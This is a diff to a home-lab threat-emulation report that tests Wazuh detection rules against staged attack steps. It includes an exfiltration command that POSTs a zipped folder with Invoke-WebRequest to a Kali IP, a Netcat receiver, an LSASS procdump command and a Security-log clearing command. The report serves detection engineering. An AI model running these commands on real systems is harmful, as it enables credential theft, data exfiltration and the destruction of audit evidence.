@@ -106,7 +106,7 @@ A rule can only fire if its event exists. The following are configuration requir
 | 8b | Credential Access | Credential Access | T1003.001 | `procdump -ma lsass.exe` through the reverse shell | Sysmon EID 10 | `100411` |
 | 9 | File Lifecycle | — | — | Modify and delete files in the monitored folder | syscheck events | FIM (modified, deleted) |
 | 10 | Cleanup / Anti-Forensics | Defense Evasion | T1070.001 | `wevtutil cl Security` | Security Event `1102` | `100412` |
-| 11 | HTTP Transfer / Exfiltration Simulation | Execution, Exfiltration | T1059.001; **T1048.003 conditional** (HTTP outside C2; not cloud storage) | `Compress-Archive`; committed Windows script calls `Invoke-WebRequest -Method Post -InFile` to Kali `:8000/upload` | PowerShell Module Logging 4103; Sysmon EID 3 fallback | `100413` **pending**; generic `100404` may observe PowerShell network connection |
+| 11 | HTTP Transfer / Exfiltration Simulation | Execution, Exfiltration | T1059.001; **T1048.003 conditional** (HTTP outside C2; not cloud storage) | `Compress-Archive`; committed Windows script calls `nIvoke-WebRequest -Method Post -InFile` to Kali `:4445/upload` | PowerShell Module Logging 4103; Sysmon EID 3 fallback | `100413` **pending**; generic `100404` may observe PowerShell network connection |
 
 ---
 
@@ -550,7 +550,7 @@ See [`threat-emulation/evidence-logs/stage05-rule-100407-recon-burst.json`](http
 
 - **`100402`'s scope is now confirmed** (current rule XML): `(?i)(?:whoami|systeminfo|tasklist|nltest|net|net1)\.exe$`, plus the correlation rule `100407` now correlates off `100402` directly. `net.exe`/`net1.exe` both match, as shown. **`arp` is confirmed not in this pattern** — `ARP.EXE` only triggers the generic `100400` ("Shell spawned child process"), not "Reconnaissance binary executed". Add `arp` to `100402` if parity with `net`/`net1`/`whoami` is wanted; it is a one-token change.
 - **`100407`'s correlation logic is confirmed correct**: it fired once, exactly when the 3rd qualifying binary (`systeminfo`) landed within the 120-second window of the first (`whoami`). No second `100407` appeared for the later `net`/`net1` events; `100407` has no `ignore`, so this is not explained by the threshold arithmetic alone — treat it as observed behaviour.
-- **`100400`'s known bug is fixed and its scope confirmed widened.** The earlier version truncated the description at `$(win.eventdata.user` (missing closing parenthesis, `docs/03` §5 item 13) — the new alert renders the full value. `parentImage` is now confirmed `(?i)(?:powershell|pwsh|cmd|net)\.exe$` (widened beyond PowerShell, matching the rename to "Shell spawned child process" / group `shell_child`), and a negated `image` filter now excludes `whoami`, `systeminfo`, `tasklist`, `nltest`, `curl`, `bitsadmin` and `certutil`, so that the more specific rules are not shadowed. **Caveat (current XML)**: the live exclusion list does not contain `net`/`net1`. One event produces one alert and `100400` precedes `100402` in the file, so `net`/`net1` started from a shell should now be reported as `100400` and not counted by `100407`. The raw alerts above predate that exclusion list; re-run Stage 5 before relying on them for `net`/`net1`.
+- **`100400`'s known bug is fixed and its scope confirmed widened.** The earlier version truncated the description at `$(win.eventdata.user` (missing closing parenthesis, `docs/03` §5 item 13) — the new alert renders the full value. `parentImage` is now confirmed `(?i)(?:powershell|pwsh|cmd|net)\.exe$` (widened beyond PowerShell, matching the rename to "Shell spawned child process" / group `shell_child`), and a negated `image` filter now excludes `whoami`, `systeminfo`, `tasklist`, `nltest`, `curl`, `bitsadmin` and `certutil`, so that the more specific rules are not shadowed. The current XML excludes net.exe and net1.exe from the generic 100400 rule, while 100402 explicitly matches both binaries. This configuration is intended to prevent the generic shell-child rule from preempting the more specific discovery rule. However, the October 13 historical alerts predate the latest exclusion-list revision, so a fresh Stage 5 re-test is still required to validate the current rule interaction.
 - **Built-in `92031` does not appear in Figure 7's six rows** — six custom alerts cover the same window the original run's single `92031` alert occupied, and no `92031` row is visible here. This is not an exhaustive search of the whole index, so it is reported as "not observed in this view" rather than "confirmed absent".
 - **Group names**: the stored alerts for later rules (`100406`, `100412`) show merged group names (`windowspersistence`, `windowslog_cleared`); see `docs/03` §5 item 16, and check `rule.groups` on a fresh `100400`/`100402` alert as well.
 
@@ -839,40 +839,69 @@ Security audit-log clearing was detected by custom rule `100412` during the Octo
 
 ### Stage 11 — HTTP Transfer / Exfiltration Simulation (T1059.001; T1048.003 conditional)
 
-**Source of truth:** [`11-exfiltration_windows.ps1`](../threat-emulation/attack-scripts/11-exfiltration_windows.ps1) and [`11-exfiltration_kali.sh`](../threat-emulation/attack-scripts/11-exfiltration_kali.sh) as committed. This is **not** the Stage 8 `TCPClient` reverse shell. The older port-4445 raw-socket transfer is historical and no longer matches the committed Windows Stage 11 script.
+**Source of truth:** [`11-exfiltration_windows.ps1`](../threat-emulation/attack-scripts/11-exfiltration_windows.ps1) and [`11-exfiltration_kali.sh`](../threat-emulation/attack-scripts/11-exfiltration_kali.sh).
+
+This stage is separate from the Stage 8 `TCPClient` reverse shell. Stage 11 uses PowerShell `Invoke-WebRequest` on the Windows victim to send an HTTP POST request to a Netcat listener on Kali over **TCP port 4445**.
 
 **Current Windows procedure (committed, not evidence of successful transfer):**
 
 ```powershell
 Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force
+
 Invoke-WebRequest -Uri "http://192.168.60.135:4445/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip
 ```
 
-**Current Kali script (committed):**
+**Kali receiver (the committed script should be updated to use this listener exclusively):**
 
 ```bash
-python3 -m http.server 8000
-# Subsequent `nc -lvnp 4445` is not reached until the server exits;
-# it also listens on a different port than the Windows HTTP request.
+#!/usr/bin/env bash
+# Stage 11 — Netcat receiver for Windows Invoke-WebRequest POST
+# Host: Kali Linux — isolated lab network only
+
+set -euo pipefail
+
+LISTEN_PORT=4445
+OUTPUT_FILE="stage11-http-request.bin"
+
+nc -lvnp "$LISTEN_PORT" > "$OUTPUT_FILE"
 ```
 
-Stock Python `http.server` does **not** implement a POST upload handler that saves the request body to disk. A request line visible in the server terminal is not proof that a ZIP was received intact. If a separate receiver was used in an actual experiment, its code and a saved received file are **not currently in this repository**. The current files do not establish a successful file-transfer outcome. An HTTP receiver that actually stores the POST body, plus a hash comparison, is needed for a reproducible end-to-end result.
+**Important implementation note:** The Kali Stage 11 script must not start `python3 -m http.server 8000` before the Netcat command. That server runs in the foreground, preventing the subsequent listener from starting until the server exits. Stage 11 should use the Netcat listener on port `4445` only.
 
-**Detection engineering alignment.** Custom Wazuh `100413` searches PowerShell Module Logging fields `win.eventdata.contextInfo` (containing `Invoke-WebRequest`) and `win.eventdata.payload`, as a child of built-in `91801`. The agent's committed `ossec.conf` **already includes** `Microsoft-Windows-PowerShell/Operational`, but the policy enabling Module Logging (4103), event field extraction, built-in parent chain and positive `100413` alert are **not verified**. The regex targets web-request activity, **not independent proof of exfiltration**. Sysmon `100404` can provide a more generic process-network signal if an eligible EID 3 event is generated.
+The committed Kali Stage 11 script now uses a Netcat listener exclusively on TCP port 4445. Port 8000 remains reserved for the Stage 6 EICAR HTTP server and is not used by the Stage 11 transfer procedure. Netcat captures the raw HTTP request rather than extracting the ZIP archive automatically.
+
+A matching SHA256 comparison therefore requires extracting the HTTP request body before hashing it. Netcat also does not return a normal HTTP response, so `Invoke-WebRequest` may report a response-related error even after sending the request. Inspect the Kali capture rather than treating the PowerShell command's exit status as proof of successful transfer.
+
+**Detection engineering alignment.**
+
+Custom Wazuh rule `100413` is intended to detect PowerShell Module Logging activity (Event ID 4103) associated with `Invoke-WebRequest`, under built-in PowerShell Operational rule `91801`.
+
+The agent's committed `ossec.conf` already includes `Microsoft-Windows-PowerShell/Operational`. However, Windows Module Logging activation, Event 4103 ingestion, the decoded event fields, parent-rule compatibility and positive `100413` alert generation are not yet verified.
+
+The committed `100413` XML currently checks `win.eventdata.payload` for `Invoke-WebRequest`; it does not currently match `contextInfo`. The actual Event 4103 fields must be inspected before changing this logic.
+
+The rule identifies PowerShell web-request activity, not independent proof that the file was successfully transferred. Sysmon rule `100404` may provide an additional process-network signal if an eligible Event ID 3 is generated and collected.
 
 | Check | Evidence required | Current status |
 |---|---|---|
 | Local archive created | `exfil_test.zip` exists and has a SHA256 on Windows | Script configured; no preserved outcome |
-| HTTP transfer requested | Windows request to Kali `:8000/upload`, plus matching Kali-side record | No preserved request/response evidence |
-| ZIP received in full | Kali receiver saves ZIP; SHA256 matches Windows | **Unverified with committed listener** |
-| PowerShell telemetry | Windows Operational EID 4103 with relevant `contextInfo`/`payload` | Channel configured; 4103 activation/ingestion unverified |
-| Wazuh detection | Raw `rule.id: 100413` alert with original event fields | Not captured |
-| Alternate network alert | Raw Sysmon EID 3 and rule `100404`, if observed | Not captured for this Stage 11 run |
+| HTTP transfer requested | Windows sends a POST request to Kali `192.168.60.135:4445/upload`; Kali captures the incoming connection | No preserved request/capture evidence |
+| ZIP received in full | Extract the HTTP body from the Kali capture and compare its SHA256 with the Windows archive | **Unverified** |
+| PowerShell telemetry | Windows Operational Event 4103 with relevant `contextInfo` / `payload` fields | Channel configured; 4103 activation and ingestion unverified |
+| Wazuh detection | Original raw alert with `rule.id: 100413` and event fields | Not captured |
+| Alternate network alert | Raw Sysmon Event ID 3 and rule `100404`, if observed | Not captured for this Stage 11 run |
 
-**ATT&CK interpretation:** `T1059.001` accurately describes execution via PowerShell. Sending data to a Kali-hosted **HTTP** endpoint is **not** `T1567.002` (cloud storage). For a verified unencrypted HTTP transfer independent of the C2 channel, `T1048.003` may describe the simulated exfiltration procedure; if the same C2 channel carries the data, reassess `T1041`. Neither label should be treated as proof that transfer succeeded.
+**ATT&CK interpretation:** `T1059.001` accurately describes execution via PowerShell. Sending data to a Kali-hosted HTTP endpoint is not `T1567.002` (Exfiltration to Cloud Storage). For a verified unencrypted HTTP transfer independent of the C2 channel, `T1048.003` may describe the simulated exfiltration procedure. If the same C2 channel carries the data, reassess `T1041`. Neither technique mapping should be treated as proof that the transfer succeeded.
 
-**Verdict: ❌ No preserved Stage 11 detection or completed transfer evidence.** The Stage 11 Windows script and intended detection are aligned, but neither raw `100413` alerts nor end-to-end file integrity have been demonstrated by committed evidence.
+**Port allocation:**
 
+| Port | Stage | Purpose |
+|---|---|---|
+| `8000` | Stage 6 | Python HTTP server for EICAR delivery |
+| `4444` | Stage 8 | Netcat listener for the reverse shell |
+| `4445` | Stage 11 | Netcat receiver for the HTTP POST request |
+
+**Verdict**: ❌ No preserved Stage 11 detection or completed transfer evidence. The committed Windows client and Kali Netcat listener are configured to use TCP port 4445. However, no complete transfer, independently verified file integrity, or raw Wazuh 100413 alert has yet been preserved.
 ---
 
 ## 5. Attack Timeline (UTC)
@@ -1018,10 +1047,10 @@ Everything the emulation leaves behind, with the command that removes it.
 | Exfiltration archive | 11 | `C:\Windows\Temp\exfil_test.zip` | `del C:\Windows\Temp\exfil_test.zip` |
 | Locked account `LENOVO` | 2, 3 | Windows local accounts | `net user lenovo /active:yes` |
 | Cleared Security log | 10 | Windows Security log | Not recoverable on the host; the history remains in Wazuh |
-| Received archive (**not evidenced**), packet capture, Hydra state | 0, 11 | Kali home directory | Delete any files **actually created** during testing; `received_exfil.zip` is only an expected future artifact |
-| Listeners | 6, 8, 11 | Kali ports `8000`, `4444`; `4445` remains a legacy Stage 11 script line | Stop running processes; `nc :4445` is not part of the current Windows HTTP POST path |
+| Raw HTTP request capture (**not yet evidenced**) | 11 | Kali working directory | Preserve the capture if needed for investigation; remove temporary files after evidence collection. |
+| Listeners | 6, 8, 11 | Kali ports `8000` (Stage 6 EICAR HTTP server), `4444` (Stage 8 reverse-shell listener), and `4445` (Stage 11 Netcat receiver for the Windows HTTP POST request) | Stop each listener after its corresponding stage; terminate the associated process when testing is complete. |
 
-**Indicators for hunting this emulation:** Kali `192.168.60.135`; port `4444` (Stage 8 reverse shell) and HTTP port `8000` (Stage 11 planned POST); `4445` is a **legacy Stage 11 marker**; Run value `UpdaterSvc`; Event `1102` on the endpoint. `procdump.exe` was **not executed** in the recorded tests.
+**Indicators for hunting this emulation:** Kali `192.168.60.135`; port `8000` (Stage 6 EICAR HTTP delivery), port `4444` (Stage 8 reverse shell), and port `4445` (Stage 11 HTTP POST / Netcat receiver); Run value `UpdaterSvc`; Event `1102` on the endpoint. `procdump.exe` was **not executed** in the recorded tests.
 
 ---
 
@@ -1042,15 +1071,14 @@ Everything the emulation leaves behind, with the command that removes it.
 
 Most event evidence discussed in Section 4 is preserved under
 [`threat-emulation/evidence-logs/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/), and
-every command run during the chain is committed as a runnable script under
-[`threat-emulation/attack-scripts/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/attack-scripts/).
+Scripts for executed and planned emulation steps are maintained under [`threat-emulation/attack-scripts/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/attack-scripts/).. The presence of a script does not establish that the corresponding step was executed; actual execution and validation status are documented in this report.
 Each log file is plain JSON (one alert per file); its status (verified, condensed
 excerpt, rule mismatch) is recorded in the index linked at the end of this appendix.
 
 | Stage | Attack script(s) | Evidence log(s) |
 |---|---|---|
 | 0 Preparation | `00-preparation_kali.sh` | — |
-| 1 Reconnaissance | `01-reconnaissance_kali.sh` | `baseline-pfsense-synburst-example1.json` |
+| 1 Reconnaissance | `01-reconnaissance_kali.sh` | `stage01-pfsense-synburst.json` (not attributable to the scan) |
 | 2 Brute Force | `02-bruteforce_kali.sh` | `stage02-suricata-ssh-bruteforce.json`, `stage02-windows-4625-failed-logon.json`, `stage02-rule-100408-bruteforce-retest.json` |
 | 3 Successful Access | `03-successful-access_kali.sh` | `stage03-windows-4740-account-locked.json`, `stage03-rule-100410-correlation-excerpt.json`, `stage03-rule-92657-successful-logon.json` |
 | 4 Execution | `04-execution_windows.ps1` | `stage04-sysmon-encoded-powershell.json` |
@@ -1061,9 +1089,9 @@ excerpt, rule mismatch) is recorded in the index linked at the end of this appen
 | 8b Credential Access | `08b-credential-access_windows.cmd` | `stage08b-rule-100411-lsass-excerpt.json`, `stage08b-rule-100411-lsass-false-positive-windowsdefender.json` |
 | 9 File Lifecycle | `09-file-lifecycle_windows.ps1` | — (screenshot only, Figure 15) |
 | 10 Anti-Forensics | `10-anti-forensics_windows.ps1` | `stage10-windows-1102-log-cleared.json`, `stage10-rule-100412-excerpt.json` |
-| 11 HTTP Transfer / Exfiltration Simulation | `11-exfiltration_kali.sh`, `11-exfiltration_windows.ps1` (`Invoke-WebRequest` POST; stock server has no upload handler) | — (not yet evidenced) |
+| 11 HTTP Transfer / Exfiltration Simulation | `11-exfiltration_kali.sh`, `11-exfiltration_windows.ps1` (`Invoke-WebRequest` POST to Kali Netcat listener on TCP port `4445`; raw HTTP capture and detection not yet evidenced) | — (not yet evidenced) |
 
-Five further logs sit under `threat-emulation/evidence-logs/` as supplementary
+Six further logs sit under `threat-emulation/evidence-logs/` as supplementary
 baseline evidence, not tied to a specific chain stage: `baseline-pfsense-udp-allowed.json`, `baseline-pfsense-icmp-mismatch.json`, `baseline-pfsense-synburst-example1.json`, `baseline-pfsense-synburst-e2e.json`, `baseline-suricata-portscan.json`, and `stage08-suricata-reverse-shell-baseline-test.json` (the first reverse-shell
 rule test, run before the chain).
 
